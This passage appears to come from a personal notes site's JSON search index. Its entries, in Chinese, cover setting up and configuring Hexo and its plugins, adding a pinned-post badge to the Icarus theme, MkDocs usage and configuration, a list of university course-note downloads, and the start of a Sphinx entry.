\u6bd4\u5982\u589e\u52a0\u7f6e\u9876\u7684\u529f\u80fd\uff1a \u7f6e\u9876 \u6bcf\u7bc7\u6587\u7ae0\u7684 card \u548c\u5185\u5bb9\u9875\u9762\u90fd\u662f\u7531 layout/common/article.jsx \u6765\u751f\u6210 \u6240\u4ee5\u76f4\u63a5\u5728 .card.level-left \u91cc\u9762\u52a0\uff1a {page.top && < span class = \"level-item\" style = \"color: #ff7242;\" > < i class = \"fas fa-thumbtack\" style = \"margin-right: 0.3em;\" ></ i > \u7f6e\u9876 </ span > } \u5c31\u53ef\u4ee5\u4e3a\u6587\u4ef6\u5934\u6709 top: true \u7684\u6587\u7ae0\u5728\u6700\u9876\u90e8\u6700\u5de6\u4fa7\u52a0\u4e0a\u7f6e\u9876\u6807\u5fd7 \u800c\u4e14\u8fd9\u4e2a\u4e3b\u9898\u4e0d\u652f\u6301\u4ece\u914d\u7f6e\u6587\u4ef6\u548c\u5f53\u524d\u76ee\u5f55\u5d4c\u5165 js \u548c css\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u53bb\u8fd9\u4e2a\u4e3b\u9898\u7684 source \u6587\u4ef6\u5939\u6539\u5c31\u597d\u4e86 Reference \u00b6 Hexo \u5b98\u7f51 zzq \u6d45\u8c08\u7528 Hexo+GitHub \u642d\u5efa\u81ea\u5df1\u7684 blog Hexo \u535a\u5ba2\u642d\u5efa\u8bf4\u660e\u4e66\uff08\u6307\u5317\u4e66\uff09 \u4ece\u96f6\u642d\u5efa Hexo + Github \u535a\u5ba2","title":"hexo"},{"location":"misc/hexo/#hexo","text":"Abstract \u5f53\u65f6\u5728\u7528 mkdocs \u642d\u5efa\u4e86\u535a\u5ba2\u4e4b\u540e\u611f\u89c9\u4e0d\u50cf\u4e2a\u535a\u5ba2\u7684\u6837\u5b50\uff0c\u6240\u4ee5\u6362\u4e86 hexo\uff0c\u7528\u6765\u751f\u6210\u535a\u5ba2\u7f51\u7ad9\u8fd8\u662f\u5f88\u65b9\u4fbf\u7684\u3002","title":"hexo \u4f7f\u7528\u8bb0\u5f55"},{"location":"misc/hexo/#_1","text":"hexo \u57fa\u4e8e node.js\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 npm install -g hexo-cli \u6765\u5b89\u88c5","title":"\u5b89\u88c5"},{"location":"misc/hexo/#_2","text":"\u521b\u5efa blog \u76ee\u5f55\u653e\u7f6e\u535a\u5ba2\uff1a $ hexo init blog # \u4e5f\u53ef\u4ee5\u624b\u52a8\u521b\u5efa\u76ee\u5f55\u540e\u8fdb\u5165 $ mkdir blog & cd blog & hexo init \u5b89\u88c5\u9700\u8981\u7684\u5305\uff1a $ npm install \u542f\u52a8\u5185\u7f6e\u9884\u89c8\u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3 4000\uff09\uff1a $ hexo s # hexo serve \u751f\u6210\u7f51\u7ad9\uff1a $ hexo g # hexo generate \u4e4b\u540e\u4f1a\u751f\u6210\u4e00\u4e2a public/ \u6587\u4ef6\u5939\uff0c\u4e3a\u7f51\u7ad9\u6e90\u7801 hexo init \u751f\u6210\u7684\u76ee\u5f55\u7ed3\u6784\u4e3a\uff1a \u251c\u2500\u2500 _config.yml # \u914d\u7f6e\u6587\u4ef6 \u251c\u2500\u2500 package.json # \u5e94\u7528\u4fe1\u606f \u251c\u2500\u2500 scaffolds/ # \u6a21\u677f\u6587\u4ef6\u5939 \u251c\u2500\u2500 source/ # \u6e90\u6587\u4ef6\u5939 | \u2514\u2500\u2500 _posts/ # \u7a3f\u4ef6\u6587\u4ef6\u5939 \u2514\u2500\u2500 themes/ # \u4e3b\u9898\u6587\u4ef6\u5939 \u521b\u5efa\u4e00\u7bc7\u65b0\u7684\u6587\u7ae0\u4f7f\u7528 hexo new \u547d\u4ee4\uff0c\u9ed8\u8ba4\u4f1a\u521b\u5efa\u4e00\u7bc7 post\uff0c\u6bd4\u5982 hexo new \"test\" \u4f1a\u5728 source/_post/ \u91cc\u4f7f\u7528 scaffolds/post.md \u4e3a\u6a21\u677f\u521b\u5efa\u4e00\u4e2a test.md","title":"\u4f7f\u7528"},{"location":"misc/hexo/#_3","text":"_config.yml \u8fd9\u4e2a\u6587\u4ef6\u662f hexo \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u5185\u5bb9\uff1a title \uff1a\u7f51\u7ad9\u6807\u9898 subtitle \uff1a\u526f\u6807\u9898 description \uff1a\u7f51\u7ad9\u63cf\u8ff0 keywords \uff1a\u7f51\u7ad9\u5173\u952e\u8bcd author \uff1a\u4f5c\u8005 language \uff1a\u8bed\u8a00 timezone \uff1a\u65f6\u533a \u4ee5\u4e0a\u8bbe\u7f6e\u4f1a\u51fa\u73b0\u5728 meta \u91cc url \uff1a\u7f51\u5740 root \uff1a\u7f51\u7ad9\u6839\u76ee\u5f55 permalink \uff1a\u6c38\u4e45\u94fe\u63a5\u683c\u5f0f\uff0c\u6bd4\u5982 :year/:month/:day/:title/ source_dir \uff1a\u6e90\u6587\u4ef6\u5939\uff0c\u9ed8\u8ba4 source public_dir \uff1a\u751f\u6210\u7684\u7f51\u7ad9\u6587\u4ef6\u5939 theme \uff1a\u4e3b\u9898 \u2026\u2026 \u6240\u6709\u914d\u7f6e\u8fd8\u662f\u770b\u5b98\u7f51\uff1a https://hexo.io/zh-cn/docs/configuration","title":"\u914d\u7f6e"},{"location":"misc/hexo/#github-pages","text":"\u914d\u7f6e\u6587\u4ef6\u4e2d\uff1a deploy : - type : git repo : https://github.com/.../... branch : master \u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 hexo d \uff08 hexo deploy \uff09\u6765\u90e8\u7f72\u5230 GitHub pages \u4e0a\uff08\u6216\u8005 hexo d -g \u751f\u6210\u5e76\u90e8\u7f72\uff09","title":"\u90e8\u7f72\u5230 GitHub pages"},{"location":"misc/hexo/#_4","text":"\u5b89\u88c5\u63d2\u4ef6\u90fd\u53ef\u4ee5\u901a\u8fc7 npm install ... --save \u6765\u5b89\u88c5","title":"\u4e00\u4e9b\u63d2\u4ef6"},{"location":"misc/hexo/#hexo-abbrlink","text":"\u751f\u6210\u4e00\u4e2a\u77ed\u7684\u6c38\u4e45\u94fe\u63a5\uff0c\u5b89\u88c5\u540e\u53ea\u9700\u8981\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6539\uff1a permalink : p/:abbrlink.html abbrlink : alg : crc32 rep : hex \u5c31\u4f1a\u4e3a\u5229\u7528 crc32 \u4e3a\u6bcf\u7bc7\u6587\u7ae0\u8bbe\u7f6e\u4e00\u4e2a hex \u503c\u7684\u6c38\u4e45\u94fe\u63a5","title":"hexo-abbrlink"},{"location":"misc/hexo/#hexo-blog-encrypt","text":"\u53ef\u4ee5\u4e3a\u6587\u7ae0\u52a0\u5bc6\uff0c\u53ea\u9700\u8981\u5728 md \u7684\u6587\u4ef6\u5934\u52a0\u4e0a\uff1a password : ... \u5c31\u53ef\u4ee5\u52a0\u5bc6\u8fd9\u7bc7\u6587\u7ae0\u3002\u66f4\u591a\u7528\u6cd5\u548c\u8bbe\u7f6e\u5728 GitHub \u4e0a\uff1a D0n9X1n/hexo-blog-encrypt","title":"hexo-blog-encrypt"},{"location":"misc/hexo/#hexo-generator-indexarchivecategorytag","text":"\u57fa\u672c\u662f\u5fc5\u987b\u8981\u88c5\u7684\u4e86\uff0c\u7528\u6765\u751f\u6210\u4e3b\u9875/\u5f52\u6863/\u5206\u7c7b/\u6807\u7b7e\u6587\u4ef6\u5939 index_generator : path : '' per_page : 10 order_by : '-date' archive_generator : per_page : 30 tag_generator : per_page : 30 category_generator : per_page : 30 \u5206\u522b\u7528\u6765\u6307\u5b9a\u5404\u4e2a\u9875\u9762\u6bcf\u4e2a\u9875\u9762\u7684\u6587\u7ae0\u4e2a\u6570","title":"hexo-generator-index/archive/category/tag"},{"location":"misc/hexo/#hexo-generator-feed","text":"\u7528\u6765\u751f\u6210 RSS \u8ba2\u9605 xml \u6587\u4ef6 feed : enable : true type : atom path : atom.xml limit : 20","title":"hexo-generator-feed"},{"location":"misc/hexo/#hexo-generator-index-pin-top","text":"\u7f6e\u9876\u67d0\u7bc7\u6587\u7ae0\uff0c\u53ea\u9700\u8981\u5728\u6587\u4ef6\u5934\u52a0\u4e0a top: true \u5373\u53ef \u4f46\u662f icarus \u4e3b\u9898\u597d\u50cf\u4e0d\u652f\u6301\u2026\u2026","title":"hexo-generator-index-pin-top"},{"location":"misc/hexo/#hexo-generator-searchsearchdb","text":"\u7528\u6765\u751f\u6210\u641c\u7d22\u76f8\u5173 search : path : search.xml field : all content : true limit : 9999","title":"hexo-generator-search/searchdb"},{"location":"misc/hexo/#hexo-wordcount","text":"\u7528\u6765\u751f\u6210\u5b57\u6570\u7edf\u8ba1\u3002\u597d\u50cf\u4e0d\u9700\u8981\u914d\u7f6e\u4ec0\u4e48","title":"hexo-wordcount"},{"location":"misc/hexo/#_5","text":"\u73b0\u5728\u7684\u535a\u5ba2\u7528\u4e86\u4e00\u4e2a\u633a\u7b80\u6d01\u7684\u4e3b\u9898\uff0c ppoffice/hexo-theme-icarus \u4f46\u662f\u8fd9\u4e2a\u4e3b\u9898\u7684\u5f0a\u7aef\u4e5f\u633a\u591a\uff0c\u6bd4\u5982\u6240\u6709\u9875\u9762\u90fd\u4f1a\u52a0\u8f7d\u4e00\u4e2a content.json\uff0c\u91cc\u9762\u5b58\u653e\u4e86\u6574\u4e2a\u7f51\u7ad9\u7684\u6240\u6709\u6587\u7ae0\u5305\u62ec\u5185\u5bb9\uff0c\u5bfc\u81f4\u52a0\u8f7d\u5f88\u6162\uff08\u8822\u7684\u5f88\uff09 \u6574\u4e2a\u4e3b\u9898\u57fa\u672c\u4e0a\u662f\u7528 jsx \u6765\u5199\u7684\uff0c\u6837\u5f0f\u662f\u7528 styl \u5199\u7684\uff0c\u6539\u7684\u8bdd\u8fd8\u6bd4\u8f83\u65b9\u4fbf \u6bd4\u5982\u589e\u52a0\u7f6e\u9876\u7684\u529f\u80fd\uff1a \u7f6e\u9876 \u6bcf\u7bc7\u6587\u7ae0\u7684 card \u548c\u5185\u5bb9\u9875\u9762\u90fd\u662f\u7531 layout/common/article.jsx \u6765\u751f\u6210 \u6240\u4ee5\u76f4\u63a5\u5728 .card.level-left \u91cc\u9762\u52a0\uff1a {page.top && < span class = \"level-item\" style = \"color: #ff7242;\" > < i class = \"fas fa-thumbtack\" style = \"margin-right: 0.3em;\" ></ i > \u7f6e\u9876 </ span > } \u5c31\u53ef\u4ee5\u4e3a\u6587\u4ef6\u5934\u6709 top: true \u7684\u6587\u7ae0\u5728\u6700\u9876\u90e8\u6700\u5de6\u4fa7\u52a0\u4e0a\u7f6e\u9876\u6807\u5fd7 \u800c\u4e14\u8fd9\u4e2a\u4e3b\u9898\u4e0d\u652f\u6301\u4ece\u914d\u7f6e\u6587\u4ef6\u548c\u5f53\u524d\u76ee\u5f55\u5d4c\u5165 js \u548c css\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u53bb\u8fd9\u4e2a\u4e3b\u9898\u7684 source \u6587\u4ef6\u5939\u6539\u5c31\u597d\u4e86","title":"\u4e3b\u9898"},{"location":"misc/hexo/#reference","text":"Hexo \u5b98\u7f51 zzq \u6d45\u8c08\u7528 Hexo+GitHub \u642d\u5efa\u81ea\u5df1\u7684 blog Hexo \u535a\u5ba2\u642d\u5efa\u8bf4\u660e\u4e66\uff08\u6307\u5317\u4e66\uff09 \u4ece\u96f6\u642d\u5efa Hexo + Github \u535a\u5ba2","title":"Reference"},{"location":"misc/mkdocs/","text":"mkdocs \u4f7f\u7528\u8bb0\u5f55 \u00b6 Abstract \u6211\u6700\u65e9\u63a5\u89e6\u7684\u7f51\u7ad9\u751f\u6210\u5668\u5c31\u662f mkdocs\uff0c\u7136\u540e\u7528\u5b83\u642d\u4e86\u535a\u5ba2\u3002\u4f46\u7531\u4e8e\u5f53\u65f6\u89c9\u5f97\u770b\u8d77\u6765\u592a\u5e73\u6de1\u3001\u529f\u80fd\u5c11\u7b49\u539f\u56e0\u629b\u5f03\u4e86\u5b83\u6362\u6210\u4e86 hexo \u540e\u6765\u6253\u7b97\u641e\u4e00\u4e2a\u7b14\u8bb0\u672c\u6574\u7406\u4e00\u4e9b\u6709\u4ef7\u503c\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u642d\u4e86\u8fd9\u4e2a\u7f51\u7ad9\uff0c\u7528\u56de\u4e86 mkdocs mkdocs \u5c31\u5f88\u9002\u5408\u7528\u6765\u505a\u8fd9\u79cd\u7ad9\u70b9\uff0c\u800c\u4e14\u5b83\u57fa\u4e8e python\uff0c\u4f7f\u7528 pymarkdown \u6e32\u67d3 markdown \u6587\u6863\uff0c\u6700\u540e\u4f7f\u7528 html \u6a21\u677f\u6e32\u67d3\uff0c\u4e5f\u5f88\u65b9\u4fbf\u4fee\u6539\u3002\u6240\u4ee5 mkdocs \u8fd8\u662f\u5f88\u9999\u7684 \u5b89\u88c5 \u00b6 mkdocs \u662f python \u7684\u4e00\u4e2a\u5305\uff0c\u76f4\u63a5 pip install mkdocs \u5c31\u53ef\u4ee5\u4e86 \u4f7f\u7528 \u00b6 $ mkdocs new test # \u521b\u5efa\u4e00\u4e2a\u540d\u4e3a test \u7684\u6587\u4ef6\u5939,\u5b58\u50a8\u4ee3\u7801 $ cd test \u6b64\u65f6\u7684\u76ee\u5f55\u7ed3\u6784 test/ \u251c\u2500\u2500 docs/ # \u5b58\u653emarkdown\u6587\u6863 \u2502 \u2514\u2500\u2500 index.md # \u4e3b\u9875 \u2514\u2500\u2500 mkdocs.yml # \u914d\u7f6e\u6587\u4ef6 \u6253\u5f00\u5b9e\u65f6\u6e32\u67d3\u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3 8000\uff09\uff0c\u5e76\u4e14\u4f7f\u7528 watchdog \u76d1\u63a7\u6587\u4ef6\u5939\u5185\u7684\u66f4\u6539 $ mkdocs serve \u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165 127.0.0.1:8000 \u9884\u89c8\uff0c\u7ec8\u7aef\u952e\u5165 Ctrl + C \u5173\u95ed\u670d\u52a1\u5668 $ mkdocs build # \u751f\u6210\u9759\u6001\u7f51\u9875\u4ee3\u7801 \u8fd9\u65f6\u5df2\u7ecf\u751f\u6210\u4e86 site/ \u6587\u4ef6\u5939\uff0c\u53ef\u4ee5\u5c06\u91cc\u9762\u7684\u5185\u5bb9\u90e8\u7f72\u5230\u7f51\u7ad9\u4e0a\u4e86 $ mkdocs gh-deploy \u81ea\u52a8\u6839\u636e mkdocs.yml \u4e2d\u8bbe\u7f6e\u7684\u9879\u76ee\u5730\u5740\u90e8\u7f72\u5230 GitHub \u7684 gh-pages \u5206\u652f\u4e2d \u914d\u7f6e\u6587\u4ef6 \u00b6 site_name \uff1a \u5fc5\u586b \uff0c\u6587\u6863\u4e3b\u6807\u9898\u540d\u79f0 site_url \uff1a\u6700\u7ec8\u7684\u7f51\u7ad9 url repo_url \uff1a\u5bf9\u5e94\u7684 GitHub repo \u7684\u94fe\u63a5\uff0c\u7528\u4e8e deploy \u548c\u53f3\u4e0a\u89d2\u7684\u94fe\u63a5 edit_url \uff1a\u76f8\u5bf9\u4e8e repo \u94fe\u63a5\u7684 docs \u76ee\u5f55\u5730\u5740 site_description \u7ad9\u70b9\u63cf\u8ff0 copyright \uff1a\u5de6\u4e0b\u89d2\u7248\u6743\u4fe1\u606f theme: \u4e3b\u9898\u6837\u5f0f\u4f8b\u5982: theme : name : 'material' # \u4f7f\u7528material\u4e3b\u9898,\u9700\u8981pip\u5b89 \u88c5mkdocs-material language : 'zh' # \u4f7f\u7528\u4e2d\u6587 icon : logo : ... # \u5de6\u4e0a\u89d2\u7684 logo custom_dir : ... # \u7528\u4e8e\u8986\u76d6\u6a21\u677f feature : ... font : # \u5b57\u4f53 text : ... code : ... palette : ... # \u914d\u8272\u65b9\u6848 markdown_extensions \uff1a\u9700\u8981\u6dfb\u52a0\u7684 pymarkdown \u6269\u5c55\uff08\u5305\u5df2\u7ecf\u968f mkdocs \u9ed8\u8ba4\u5b89\u88c5\uff09\uff0c\u5177\u4f53\u5404\u79cd\u6269\u5c55\u7684\u7528\u6cd5\u770b \u5b98\u65b9\u6587\u6863 extra \uff1a\u4e3b\u9898\u9700\u8981\u7684\u5176\u4ed6\u914d\u7f6e\uff0c\u6bd4\u5982 material \u4e3b\u9898\u7684\u53f3\u4e0b\u89d2\u94fe\u63a5 social \u548c\u6d41\u91cf\u5206\u6790 analytics \u7684\u8bbe\u7f6e extra_css \uff1a\u9644\u52a0\u7684 css \u6587\u4ef6\uff0c\u53ef\u4ee5\u662f url \u4e5f\u53ef\u4ee5\u662f\u76f8\u5bf9\u4e8e docs \u7684\u76f8\u5bf9\u8def\u5f84 extra_javascript \uff1a\u9644\u52a0\u7684 js \u6587\u4ef6\uff0c\u53ef\u4ee5\u662f url \u4e5f\u53ef\u4ee5\u662f\u76f8\u5bf9\u4e8e docs \u7684\u76f8\u5bf9\u8def\u5f84\u3002\u4f1a\u653e\u5230 body \u7684\u6700\u540e\uff0c\u5982\u679c\u9700\u8981\u653e\u5230 head \u91cc\u9700\u8981\u7528\u8986\u76d6\u6a21\u677f\u7684\u65b9\u5f0f plugins \uff1a\u4e00\u4e9b\u63d2\u4ef6\uff0c\u6bd4\u5982\u641c\u7d22 search \uff0c\u663e\u793a\u6700\u8fd1\u4fee\u6539\u65f6\u95f4 git-revision-date-localized nav \uff1a\u76ee\u5f55\u7ed3\u6784 \u672c\u7ad9\u7684\u914d\u7f6e\u6587\u6863\u5728\uff1a https://github.com/TonyCrane/note/blob/master/mkdocs.yml \uff0c\u53ef\u4f9b\u53c2\u8003 \u5177\u4f53\u7684\u5404\u79cd\u7528\u6cd5\u8fd8\u662f\u770b\u5b98\u65b9\u6587\u6863\u6bd4\u8f83\u597d\uff0c\u5f88\u5168\u9762 Reference \u00b6 mkdocs \u5b98\u65b9\u6587\u6863 pymarkdown \u5185\u7f6e extensions pymdown-extensions \u6587\u6863 mateial for mkdocs \u6587\u6863 shafish.cn \u4e0a\u7684\u6559\u7a0b","title":"mkdocs"},{"location":"misc/mkdocs/#mkdocs","text":"Abstract \u6211\u6700\u65e9\u63a5\u89e6\u7684\u7f51\u7ad9\u751f\u6210\u5668\u5c31\u662f mkdocs\uff0c\u7136\u540e\u7528\u5b83\u642d\u4e86\u535a\u5ba2\u3002\u4f46\u7531\u4e8e\u5f53\u65f6\u89c9\u5f97\u770b\u8d77\u6765\u592a\u5e73\u6de1\u3001\u529f\u80fd\u5c11\u7b49\u539f\u56e0\u629b\u5f03\u4e86\u5b83\u6362\u6210\u4e86 hexo \u540e\u6765\u6253\u7b97\u641e\u4e00\u4e2a\u7b14\u8bb0\u672c\u6574\u7406\u4e00\u4e9b\u6709\u4ef7\u503c\u7684\u5185\u5bb9\uff0c\u6240\u4ee5\u642d\u4e86\u8fd9\u4e2a\u7f51\u7ad9\uff0c\u7528\u56de\u4e86 mkdocs mkdocs \u5c31\u5f88\u9002\u5408\u7528\u6765\u505a\u8fd9\u79cd\u7ad9\u70b9\uff0c\u800c\u4e14\u5b83\u57fa\u4e8e python\uff0c\u4f7f\u7528 pymarkdown \u6e32\u67d3 markdown \u6587\u6863\uff0c\u6700\u540e\u4f7f\u7528 html \u6a21\u677f\u6e32\u67d3\uff0c\u4e5f\u5f88\u65b9\u4fbf\u4fee\u6539\u3002\u6240\u4ee5 mkdocs \u8fd8\u662f\u5f88\u9999\u7684","title":"mkdocs \u4f7f\u7528\u8bb0\u5f55"},{"location":"misc/mkdocs/#_1","text":"mkdocs \u662f python \u7684\u4e00\u4e2a\u5305\uff0c\u76f4\u63a5 pip install mkdocs \u5c31\u53ef\u4ee5\u4e86","title":"\u5b89\u88c5"},{"location":"misc/mkdocs/#_2","text":"$ mkdocs new test # \u521b\u5efa\u4e00\u4e2a\u540d\u4e3a test \u7684\u6587\u4ef6\u5939,\u5b58\u50a8\u4ee3\u7801 $ cd test \u6b64\u65f6\u7684\u76ee\u5f55\u7ed3\u6784 test/ \u251c\u2500\u2500 docs/ # \u5b58\u653emarkdown\u6587\u6863 \u2502 \u2514\u2500\u2500 index.md # \u4e3b\u9875 \u2514\u2500\u2500 mkdocs.yml # \u914d\u7f6e\u6587\u4ef6 \u6253\u5f00\u5b9e\u65f6\u6e32\u67d3\u670d\u52a1\uff08\u9ed8\u8ba4\u7aef\u53e3 8000\uff09\uff0c\u5e76\u4e14\u4f7f\u7528 watchdog \u76d1\u63a7\u6587\u4ef6\u5939\u5185\u7684\u66f4\u6539 $ mkdocs serve \u5728\u6d4f\u89c8\u5668\u4e2d\u8f93\u5165 127.0.0.1:8000 \u9884\u89c8\uff0c\u7ec8\u7aef\u952e\u5165 Ctrl + C \u5173\u95ed\u670d\u52a1\u5668 $ mkdocs build # \u751f\u6210\u9759\u6001\u7f51\u9875\u4ee3\u7801 \u8fd9\u65f6\u5df2\u7ecf\u751f\u6210\u4e86 site/ \u6587\u4ef6\u5939\uff0c\u53ef\u4ee5\u5c06\u91cc\u9762\u7684\u5185\u5bb9\u90e8\u7f72\u5230\u7f51\u7ad9\u4e0a\u4e86 $ mkdocs gh-deploy \u81ea\u52a8\u6839\u636e mkdocs.yml \u4e2d\u8bbe\u7f6e\u7684\u9879\u76ee\u5730\u5740\u90e8\u7f72\u5230 GitHub \u7684 gh-pages \u5206\u652f\u4e2d","title":"\u4f7f\u7528"},{"location":"misc/mkdocs/#_3","text":"site_name \uff1a \u5fc5\u586b \uff0c\u6587\u6863\u4e3b\u6807\u9898\u540d\u79f0 site_url \uff1a\u6700\u7ec8\u7684\u7f51\u7ad9 url repo_url \uff1a\u5bf9\u5e94\u7684 GitHub repo \u7684\u94fe\u63a5\uff0c\u7528\u4e8e deploy \u548c\u53f3\u4e0a\u89d2\u7684\u94fe\u63a5 edit_url \uff1a\u76f8\u5bf9\u4e8e repo \u94fe\u63a5\u7684 docs \u76ee\u5f55\u5730\u5740 site_description \u7ad9\u70b9\u63cf\u8ff0 copyright \uff1a\u5de6\u4e0b\u89d2\u7248\u6743\u4fe1\u606f theme: \u4e3b\u9898\u6837\u5f0f\u4f8b\u5982: theme : name : 'material' # \u4f7f\u7528material\u4e3b\u9898,\u9700\u8981pip\u5b89 \u88c5mkdocs-material language : 'zh' # \u4f7f\u7528\u4e2d\u6587 icon : logo : ... # \u5de6\u4e0a\u89d2\u7684 logo custom_dir : ... # \u7528\u4e8e\u8986\u76d6\u6a21\u677f feature : ... font : # \u5b57\u4f53 text : ... code : ... palette : ... # \u914d\u8272\u65b9\u6848 markdown_extensions \uff1a\u9700\u8981\u6dfb\u52a0\u7684 pymarkdown \u6269\u5c55\uff08\u5305\u5df2\u7ecf\u968f mkdocs \u9ed8\u8ba4\u5b89\u88c5\uff09\uff0c\u5177\u4f53\u5404\u79cd\u6269\u5c55\u7684\u7528\u6cd5\u770b \u5b98\u65b9\u6587\u6863 extra \uff1a\u4e3b\u9898\u9700\u8981\u7684\u5176\u4ed6\u914d\u7f6e\uff0c\u6bd4\u5982 material \u4e3b\u9898\u7684\u53f3\u4e0b\u89d2\u94fe\u63a5 social \u548c\u6d41\u91cf\u5206\u6790 analytics \u7684\u8bbe\u7f6e extra_css \uff1a\u9644\u52a0\u7684 css \u6587\u4ef6\uff0c\u53ef\u4ee5\u662f url \u4e5f\u53ef\u4ee5\u662f\u76f8\u5bf9\u4e8e docs \u7684\u76f8\u5bf9\u8def\u5f84 extra_javascript \uff1a\u9644\u52a0\u7684 js \u6587\u4ef6\uff0c\u53ef\u4ee5\u662f url \u4e5f\u53ef\u4ee5\u662f\u76f8\u5bf9\u4e8e docs \u7684\u76f8\u5bf9\u8def\u5f84\u3002\u4f1a\u653e\u5230 body \u7684\u6700\u540e\uff0c\u5982\u679c\u9700\u8981\u653e\u5230 head \u91cc\u9700\u8981\u7528\u8986\u76d6\u6a21\u677f\u7684\u65b9\u5f0f plugins \uff1a\u4e00\u4e9b\u63d2\u4ef6\uff0c\u6bd4\u5982\u641c\u7d22 search \uff0c\u663e\u793a\u6700\u8fd1\u4fee\u6539\u65f6\u95f4 git-revision-date-localized nav \uff1a\u76ee\u5f55\u7ed3\u6784 \u672c\u7ad9\u7684\u914d\u7f6e\u6587\u6863\u5728\uff1a https://github.com/TonyCrane/note/blob/master/mkdocs.yml \uff0c\u53ef\u4f9b\u53c2\u8003 \u5177\u4f53\u7684\u5404\u79cd\u7528\u6cd5\u8fd8\u662f\u770b\u5b98\u65b9\u6587\u6863\u6bd4\u8f83\u597d\uff0c\u5f88\u5168\u9762","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"misc/mkdocs/#reference","text":"mkdocs \u5b98\u65b9\u6587\u6863 pymarkdown \u5185\u7f6e extensions pymdown-extensions \u6587\u6863 mateial for mkdocs \u6587\u6863 shafish.cn \u4e0a\u7684\u6559\u7a0b","title":"Reference"},{"location":"misc/notes/","text":"ZJU \u90e8\u5206\u8bfe\u7a0b\u7b14\u8bb0 \u00b6 Abstract \u90e8\u5206\u6d59\u6c5f\u5927\u5b66\u8bfe\u7a0b\uff08\u4e3b\u8981\u662f\u6570\u7406\u57fa\u7840\u8bfe\u7a0b\uff09\u7684\u624b\u5199\u7b14\u8bb0 \u5185\u5bb9\u5927\u591a\u662f \u8003\u8bd5\u5468\u8865\u5929\u7684\u65f6\u5019 \u63d0\u53d6\u7684\u9ad8\u6d53\u5ea6\u6982\u5ff5\u4e00\u7c7b\uff0c\u5927\u6982\u5c31\u662f\u590d\u4e60\u7b14\u8bb0\u5427\uff08 \u81ea\u7136\u79d1\u5b66\u901a\u8bc6\u7c7b \u00b6 \u6570\u5b66\u5206\u6790\uff08\u7532\uff09I\uff08H\uff09\u7b14\u8bb0 10.8 MB / 12 P / 2022-01-04 \u4e0b\u8f7d \u7ebf\u6027\u4ee3\u6570 I\uff08H\uff09\u7b14\u8bb0 12.4 MB / 12 P / 2022-01-09 \u4e0b\u8f7d \u6570\u5b66\u5206\u6790\uff08\u7532\uff09II\uff08H\uff09\u7b14\u8bb0 16.4 MB / 15 P / 2022-06-13 \u4e0b\u8f7d \u7ebf\u6027\u4ee3\u6570 II\uff08H\uff09\u7b14\u8bb0 8.8 MB / 8 P / 2022-06-17 \u4e0b\u8f7d \u666e\u901a\u7269\u7406\u5b66 I\uff08H\uff09\u7b14\u8bb0 4 MB / 5 P / 2022-06-16 \u4e0b\u8f7d \u666e\u901a\u7269\u7406\u5b66\u5b9e\u9a8c I \u7b14\u8bb0 4.5 MB / 3 P / 2022-06-18 \u4e0b\u8f7d \u4e13\u4e1a\u57fa\u7840\u8bfe\u7a0b \u00b6 \u79bb\u6563\u6570\u5b66\u7406\u8bba\u57fa\u7840\u7b14\u8bb0 8.2 MB / 8 P / 2022-06-09 \u4e0b\u8f7d","title":"\u8bfe\u7a0b\u7b14\u8bb0"},{"location":"misc/notes/#zju","text":"Abstract \u90e8\u5206\u6d59\u6c5f\u5927\u5b66\u8bfe\u7a0b\uff08\u4e3b\u8981\u662f\u6570\u7406\u57fa\u7840\u8bfe\u7a0b\uff09\u7684\u624b\u5199\u7b14\u8bb0 \u5185\u5bb9\u5927\u591a\u662f \u8003\u8bd5\u5468\u8865\u5929\u7684\u65f6\u5019 \u63d0\u53d6\u7684\u9ad8\u6d53\u5ea6\u6982\u5ff5\u4e00\u7c7b\uff0c\u5927\u6982\u5c31\u662f\u590d\u4e60\u7b14\u8bb0\u5427\uff08","title":"ZJU \u90e8\u5206\u8bfe\u7a0b\u7b14\u8bb0"},{"location":"misc/notes/#_1","text":"\u6570\u5b66\u5206\u6790\uff08\u7532\uff09I\uff08H\uff09\u7b14\u8bb0 10.8 MB / 12 P / 2022-01-04 \u4e0b\u8f7d \u7ebf\u6027\u4ee3\u6570 I\uff08H\uff09\u7b14\u8bb0 12.4 MB / 12 P / 2022-01-09 \u4e0b\u8f7d \u6570\u5b66\u5206\u6790\uff08\u7532\uff09II\uff08H\uff09\u7b14\u8bb0 16.4 MB / 15 P / 2022-06-13 \u4e0b\u8f7d \u7ebf\u6027\u4ee3\u6570 II\uff08H\uff09\u7b14\u8bb0 8.8 MB / 8 P / 2022-06-17 \u4e0b\u8f7d \u666e\u901a\u7269\u7406\u5b66 I\uff08H\uff09\u7b14\u8bb0 4 MB / 5 P / 2022-06-16 \u4e0b\u8f7d \u666e\u901a\u7269\u7406\u5b66\u5b9e\u9a8c I \u7b14\u8bb0 4.5 MB / 3 P / 2022-06-18 \u4e0b\u8f7d","title":"\u81ea\u7136\u79d1\u5b66\u901a\u8bc6\u7c7b"},{"location":"misc/notes/#_2","text":"\u79bb\u6563\u6570\u5b66\u7406\u8bba\u57fa\u7840\u7b14\u8bb0 8.2 MB / 8 P / 2022-06-09 \u4e0b\u8f7d","title":"\u4e13\u4e1a\u57fa\u7840\u8bfe\u7a0b"},{"location":"misc/sphinx/","text":"Sphinx \u4f7f\u7528\u8bb0\u5f55 \u00b6 Abstract \u5bf9\u4e8e\u9879\u76ee\u6587\u6863\uff0cmkdocs \u770b\u8d77\u6765\u4e5f\u5f88\u8212\u9002\uff0c\u4f46\u662f\u8c8c\u4f3c\u4e0d\u80fd\u76f4\u63a5\u6839\u636e\u6587\u6863\u5b57\u7b26\u4e32\u6765\u751f\u6210\u6587\u6863\u3002\u800c\u540c\u6837\u57fa\u4e8e python \u7684 sphinx \u5c31\u5f88\u597d\u7528\uff0c\u5bf9\u4e8e python \u9879\u76ee\uff0c\u7528 sphinx \u6765\u751f\u6210\u6587\u6863\u8fd8\u662f\u5f88\u65b9\u4fbf\u7684 